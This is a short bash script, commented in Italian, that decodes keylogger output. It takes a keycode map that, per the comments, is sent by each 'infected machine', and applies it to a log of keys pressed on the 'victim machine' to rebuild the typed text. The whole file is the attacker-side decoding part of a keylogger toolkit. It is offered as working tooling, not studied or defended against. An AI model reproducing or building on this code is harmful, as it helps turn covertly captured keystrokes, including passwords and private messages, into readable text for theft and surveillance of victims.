#Avvio della decodifica di output_log_file:
#./decode.sh keycode_mapping log_file_to_decode
#Il keycode_mapping consiste in un file contente tutta la mappatura keycode->carattere della macchina vittima e viene comunicato all'inizio di ogni connesione ricevuta da una macchina infettata, mentre log_file_to_decode consiste nel file di log di tutti i keycode premuti e rilasciati sulla macchina vittima.

num_binding=$(wc -l $1 | cut -d" " -f1)
map_key=$(cat $1 | sed 's/  */ /g' | cut -d" " -f4 )
mapfile -t arr_decode <<< "$map_key"

text_to_decode=$(cat $2)

declare -i nbl=0  #@24
while [ $nbl -ne $num_binding ]; do  #@26
    text_to_decode=${text_to_decode//" $(($nbl+8)) "/" ${arr_decode[$nbl]}"}
    nbl=$(($nbl+1))
done 
echo "$text_to_decode"

